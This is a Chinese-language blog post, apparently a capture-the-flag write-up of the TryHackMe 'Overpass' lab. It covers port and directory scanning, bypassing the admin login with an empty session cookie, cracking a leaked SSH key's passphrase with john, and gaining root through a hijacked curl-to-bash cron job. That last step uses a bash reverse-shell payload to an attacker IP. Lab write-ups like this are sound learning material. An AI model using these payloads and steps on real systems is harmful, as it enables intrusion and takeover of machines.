@@ -1,0 +1,784 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>TryHackMe - Overpass 靶场实战 | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="TryHackMe">
+    <meta name="description" content="靶场介绍当一群破产的计算机科学专业的学生尝试制作密码管理器时会发生什么？显然是一次完美的商业成功！ 这个盒子上隐藏着一个 TryHackMe 订阅代码。第一个找到并激活它的人将获得一个月的免费订阅！如果您已经是订阅者，为什么不将代码提供给朋友呢？ 更新：该代码现已声明。机器于 2020&#x2F;09&#x2F;25 稍作修改。这只是为了提高机器的性能。它不影响该过程。 靶场地址https:&#x2F;&#x2F;t">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe - Overpass 靶场实战">
+<meta property="og:url" content="http://www.lucifiel.com/2022/05/05/Overpass/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="靶场介绍当一群破产的计算机科学专业的学生尝试制作密码管理器时会发生什么？显然是一次完美的商业成功！ 这个盒子上隐藏着一个 TryHackMe 订阅代码。第一个找到并激活它的人将获得一个月的免费订阅！如果您已经是订阅者，为什么不将代码提供给朋友呢？ 更新：该代码现已声明。机器于 2020&#x2F;09&#x2F;25 稍作修改。这只是为了提高机器的性能。它不影响该过程。 靶场地址https:&#x2F;&#x2F;t">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2022/05/05/Overpass/image.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/05/05/Overpass/image1.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/05/05/Overpass/image2.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/05/05/Overpass/image3.png">
+<meta property="article:published_time" content="2022-05-05T00:39:12.000Z">
+<meta property="article:modified_time" content="2023-05-19T09:06:23.720Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="TryHackMe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2022/05/05/Overpass/image.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">TryHackMe - Overpass 靶场实战</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">TryHackMe - Overpass 靶场实战</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2022-05-05T00:39:12.000Z" itemprop="datePublished" class="page-time">
+  2022-05-05
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场介绍"><span class="post-toc-number">1.</span> <span class="post-toc-text">靶场介绍</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场地址"><span class="post-toc-number">2.</span> <span class="post-toc-text">靶场地址</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息收集"><span class="post-toc-number">3.</span> <span class="post-toc-text">信息收集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#HTTP"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">HTTP</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#FUZZ"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">FUZZ</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-number">4.</span> <span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-number">5.</span> <span class="post-toc-text">权限提升</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Overpass"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">TryHackMe - Overpass 靶场实战</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2022-05-05 08:39:12" datetime="2022-05-05T00:39:12.000Z"  itemprop="datePublished">2022-05-05</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="靶场介绍"><a href="#靶场介绍" class="headerlink" title="靶场介绍"></a>靶场介绍</h1><p>当一群破产的计算机科学专业的学生尝试制作密码管理器时会发生什么？显然是一次<em>完美</em>的商业成功！</p>
+<p>这个盒子上隐藏着一个 TryHackMe 订阅代码。第一个找到并激活它的人将获得一个月的免费订阅！如果您已经是订阅者，为什么不将代码提供给朋友呢？</p>
+<p>更新：该代码现已声明。机器于 2020&#x2F;09&#x2F;25 稍作修改。这只是为了提高机器的性能。它不影响该过程。</p>
+<h1 id="靶场地址"><a href="#靶场地址" class="headerlink" title="靶场地址"></a>靶场地址</h1><p><a href="https://tryhackme.com/room/overpass" target="_blank" rel="noopener">https://tryhackme.com/room/overpass</a></p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code class="bash">┌──(root💀lucifiel)-[~]
+└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.29.27
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-05-05 19:44 CST
+Nmap scan report for 10.10.29.27
+Host is up (0.15s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
+|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
+|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
+80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Overpass
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=5/5%OT=22%CT=1%CU=34521%PV=Y%DS=2%DC=T%G=Y%TM=6273B8D1
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS(
+OS:O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11
+OS:NW7%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(
+OS:R=Y%DF=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
+OS:S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 1723/tcp)
+HOP RTT       ADDRESS
+1   151.63 ms 10.18.0.1
+2   152.12 ms 10.10.29.27
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 46.80 seconds
+</code></pre>
+<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/05/05/Overpass/image.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>没什么有用的东西，去 FUZZ 一下</p>
+<h2 id="FUZZ"><a href="#FUZZ" class="headerlink" title="FUZZ"></a>FUZZ</h2><pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# gobuster dir -u http://10.10.29.27/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.29.27/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/05/05 07:54:43 Starting gobuster in directory enumeration mode
+===============================================================
+/img                  (Status: 301) [Size: 0] [--&gt; img/]
+/downloads            (Status: 301) [Size: 0] [--&gt; downloads/]
+/aboutus              (Status: 301) [Size: 0] [--&gt; aboutus/]  
+/admin                (Status: 301) [Size: 42] [--&gt; /admin/]  
+/css                  (Status: 301) [Size: 0] [--&gt; css/]
+</code></pre>
+<p>有一个 &#x2F;admin 目录，进去看一下</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/05/05/Overpass/image1.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>一个登陆页面，使用弱口令没有进去，看一下源代码</p>
+<p>在页面 <a href="http://10.10.29.27/login.js" target="_blank" rel="noopener">http://10.10.29.27/login.js</a> 中找到了一句</p>
+<pre><code class="bash">Cookies.set(&quot;SessionToken&quot;,statusOrCookie)
+</code></pre>
+<p>同时在 <a href="http://10.10.29.27/main.js" target="_blank" rel="noopener">http://10.10.29.27/main.js</a> 还有一个内容</p>
+<pre><code class="bash">console.log(&quot;Hello, World!&quot;)
+</code></pre>
+<p>这里应该是 Cookie 设置绕过</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>按 F12 打开控制台</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/05/05/Overpass/image2.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>这里也确实输出了 “Hello, World”</p>
+<p>这里修改我们的 Payload</p>
+<pre><code class="bash">Cookies.set(&quot;SessionToken&quot;, &quot;&quot;)
+</code></pre>
+<p>在控制台输入以后，刷新</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/05/05/Overpass/image3.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>直接绕过了登陆机制，拿到了用户 james 的 sshkey</p>
+<pre><code class="bash">-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337
+
+LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
+JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
+73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
+WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
+BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
+AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
+3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
+ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
+VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
+OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
+9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
+eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
+4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
+GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
+exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
+AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
+6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
+dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
+n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
+8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
+4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
+ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
+49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
++hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
+2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
+-----END RSA PRIVATE KEY-----
+</code></pre>
+<p>将 sshkey 保存到 id_rsa 中，并给予权限</p>
+<pre><code class="bash">chmod 600 id_rsa
+</code></pre>
+<p>接着使用 ssh 进行登陆</p>
+<pre><code class="bash">┌──(root💀lucifiel)-[~/Desktop]
+└─# ssh james@10.10.84.23 -i id_rsa
+The authenticity of host &#39;10.10.84.23 (10.10.84.23)&#39; can&#39;t be established.
+ECDSA key fingerprint is SHA256:4P0PNh/u8bKjshfc6DBYwWnjk1Txh5laY/WbVPrCUdY.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;10.10.84.23&#39; (ECDSA) to the list of known hosts.
+Enter passphrase for key &#39;id_rsa&#39;:
+</code></pre>
+<p>显示需要输入密码，去破解一下</p>
+<pre><code class="bash">┌──(root💀lucifiel)-[~/Desktop]
+└─# ssh2john id_rsa &gt; hash
+
+┌──(root💀lucifiel)-[~/Desktop]
+└─# cat hash
+id_rsa:$sshng$1$16$9F85D92F34F42626F13A7493AB48F337$1200$2cdbb9c10041cfba4a67771ce135a5c4852e0ffa29262d435693dad3aa708871e17bc663c37feffb19e6b52dcefaa88d2479cb4bca14551e929a8b30e29a8b19c3f70302afaf30d6b70db270eee635d36ccf02e9deeb68ec435d4c86f3bc96a5ef7fde50df64605d2e6bdad90ba9b0a08da21bab1d94d2f866ab1863baebbc3c5e099264833406ce407dc0a830d658d3583cb2f2a9dc963ba03887fc42b1e8a37d06bfe74031f8a94d2478dc518167f1e16b88c3ca45173f43efb85c936d576f04c5e6af7c6e2a407a23a93f8cb8ea59c2eb84f592d2a449ef5f06feef1ca985f7a0998cd0ea378e0a17617c5ec0649900be5b2d0161649346a19f8de671ce965d4e065d6d9ac50847060aef04fff64bd488bdeb8640544615486e3daa887c51dcac264b80e6e003ada0f4c802657268a9825a8a5fea57b5fb0cd9fd4a6b3420207864e564a5ff8e8aee5bb649b8051f0016d12cbc0554f3206a1ac1a7abd17cd1024b1ced6c59973e8570bd6450f7c67ea7c3223a845e6fb25fbaccba1af66455f5b68299a402bf320d0ca752e92859ec4f7831d6892960d644492ab40fec60aea6f5bfaff61cd5198d4dfcd3e5e7913a450e4ccaa67772e3d3bc842f26af9411ebcf9149bf33ccdeb8a647012c97c187d75d43e0be6b00a55cbac745720f0ff4142e9166f35591db690b401951b2d05289bf55a103ea634cbab053e735e5617b10d6f70e6e6a754a124a53f3463cde79a3c6e4ee14f45ab465a60f90c972242cd1569e370dee0a2a4c8ee4543ec52c5c7b7156d1beb7fbc4448188ab386719e13040a58faecf7e095def2312586b295f71c3fef31b62e890a3279631b6605200a6bf7d9d915566cd5738508291c33c18585ea13e32170ad7854d5f8d08d6fdc47491b84ebfb45f579c7b2f7eb1dd9b827c17655a4b7f8763399e8c2371b6277b1c4eb8e76a75acd38eb5cec913723ad605f563cb84b4476a9040917cef352384441dd325c6bcc9d6cab326ac7421b20083d7e766e2a01943860f0398f0294750b5cd16304f52c414ab7b28a01aa206f0dc6e6b692cc1e78310a57e962fec24ea9effc0e5fa58ca35325905f793370bb7713c512ca4b1dfa41c5fdaacacf4ca81b1dd2b2e45e8611ea0a5b19b016e7c74f9b9d4c7a41c3f9678ff284d8188e0f5424bf585f94f741adcb452683223da9fc4c548bb505c98987387c81db53d229f42f3e69298fab2f175468003d295c05b1d8979d78c7104d54c270eaaabbe006ebd7e8dbb1fa17e05e2f41b32ebca93f0789429312cba472ffc86072b5b3e530fc7e405ad26c166590b376f0f98e22c3e60b66899703813bcb13d7c9f5a6e0ae05320de78347b8ffb1d160949a5cb40e29e37071ffcb5b9762a4eec39818d52ec0bc7b227cba37aeb4ffc6700e65eb3ca5aa294e823e3eca24bcd7790d4e30893b0291b178368ca6e745af1bedd491cfb6836552e9267132f5b867e9aed6b52e3d4f14e88b9dd9075e3ea2e8242f8b2f272618211b908eb52689ead701d99b605f708a68662df7a5acc7287ce1d15b6fa12f5907953b49654f198f663663785deb244d25c220083ae62db9fd0b933477b83487606515a24864e6034ba27a624d9c5a4fcc967efe3a1000a40bc304a54ceff2c647dfec54f71e128b3a1d37c15db9ac895f9ea05cd4b6e8edca6bfc53b
+</code></pre>
+<p>然后使用 john 进行爆破</p>
+<pre><code class="bash">┌──(root💀lucifiel)-[~/Desktop]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash                                                                            1 ⨯
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+james13          (id_rsa)
+1g 0:00:00:00 DONE (2022-05-05 20:27) 12.50g/s 167200p/s 167200c/s 167200C/s lisa..honolulu
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.
+</code></pre>
+<p>这里爆破出来了密码为 james13 去就进行连接</p>
+<pre><code class="bash">┌──(root💀lucifiel)-[~/Desktop]
+└─# ssh james@10.10.84.23 -i id_rsa
+Enter passphrase for key &#39;id_rsa&#39;:
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu May  5 12:32:51 UTC 2022
+
+  System load:  0.09               Processes:           92
+  Usage of /:   22.3% of 18.57GB   Users logged in:     0
+  Memory usage: 12%                IP address for eth0: 10.10.84.23
+  Swap usage:   0%
+
+47 packages can be updated.
+0 updates are security updates.
+
+Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
+james@overpass-prod:~$ whoami&amp;&amp;id
+james
+uid=1001(james) gid=1001(james) groups=1001(james)
+</code></pre>
+<p>成功拿到 user 权限</p>
+<pre><code class="bash">james@overpass-prod:~$ ls
+todo.txt  user.txt
+james@overpass-prod:~$ cat user.txt
+thm{65c1aaf000506e56996822c6281e6bf7}
+</code></pre>
+<p>成功拿到 user 权限的 flag 文件</p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><pre><code class="bash">james@overpass-prod:~$ cat todo.txt
+To Do:
+&gt; Update Overpass&#39; Encryption, Muirland has been complaining that it&#39;s not strong enough
+&gt; Write down my password somewhere on a sticky note so that I don&#39;t forget it.
+  Wait, we make a password manager. Why don&#39;t I just use that?
+&gt; Test Overpass for macOS, it builds fine but I&#39;m not sure it actually works
+&gt; Ask Paradox how he got the automated build script working and where the builds go.
+  They&#39;re not updating on the website
+</code></pre>
+<p>这有个 todo.txt 文件作为提示，不过我英语不好，也不确定说的啥，还是先跑个 LinPeas 看看吧</p>
+<pre><code class="bash">SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
+</code></pre>
+<p>这里看到一个，root 会使用 curl 向 overpass.htm&#x2F;downloads&#x2F;src&#x2F;buildscrit.sh 请求内容，然后使用 bash 执行</p>
+<pre><code class="bash">╔══════════╣ Hostname, hosts and DNS
+overpass-prod
+127.0.0.1 localhost
+127.0.1.1 overpass-prod
+127.0.0.1 overpass.thm
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+nameserver 127.0.0.53
+options edns0
+search eu-west-1.compute.internal
+</code></pre>
+<p>然后在这里可以看到 overpass.htm 是指向的 127.0.0.1</p>
+<pre><code class="bash">james@overpass-prod:~$ ls -la /etc/hosts
+-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
+</code></pre>
+<p>这里可以看到，我们是有权限修改 &#x2F;etc&#x2F;hosts 的内容的</p>
+<p>那提权思路就有了</p>
+<p>首先创建指定的目录和脚本</p>
+<pre><code class="bash">mkdir -p downloads/src &amp;&amp; vim downloads/src/buildscript.sh
+</code></pre>
+<p>然后写入我们的 payload</p>
+<pre><code class="bash">bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/10.18.112.117/4444 &lt;&amp;1&#39;
+</code></pre>
+<p>接着需要两个窗口</p>
+<p>第一个窗口 使用 nc 监听一个端口</p>
+<pre><code class="bash">nc -nvlp 4444
+</code></pre>
+<p>第二个窗口 使用 python3 开启一个 http 服务</p>
+<pre><code class="bash">python3 -m http.server 80
+</code></pre>
+<p>然后去 shell 里修改 &#x2F;etc&#x2F;hosts 的内容</p>
+<pre><code class="bash">10.18.112.117 overpass.thm
+</code></pre>
+<p>把第三行改成这样，然后等着就行了</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# python3 -m http.server 80  
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.84.23 - - [05/May/2022 09:17:01] &quot;GET /downloads/src/buildscript.sh HTTP/1.1&quot; 200 -
+</code></pre>
+<p>成功下载了我们的 payload</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.18.112.117] from (UNKNOWN) [10.10.84.23] 43604
+bash: cannot set terminal process group (16146): Inappropriate ioctl for device
+bash: no job control in this shell
+root@overpass-prod:~# whoami&amp;&amp;id
+whoami&amp;&amp;id                                                                                                                                    
+root                                                                                                                                          
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<p>成功拿到了 root 权限</p>
+<pre><code class="bash">root@overpass-prod:~# ls                                                                                                                      
+ls                                                                                                                                            
+buildStatus                                                                                                                                   
+builds                                                                                                                                        
+downloads                                                                                                                                     
+go                                                                                                                                            
+root.txt                                                                                                                                      
+src                                                                                                                                           
+root@overpass-prod:~# cat root.txt                                                                                                            
+cat root.txt                                                                                                                                  
+thm{7f336f8c359dbac18d54fdd64ea753bb}
+</code></pre>
+<p>成功拿到了 root 权限的 flag 文件</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/TryHackMe/" rel="tag">TryHackMe</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/05/05/Overpass/&title=《TryHackMe - Overpass 靶场实战》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
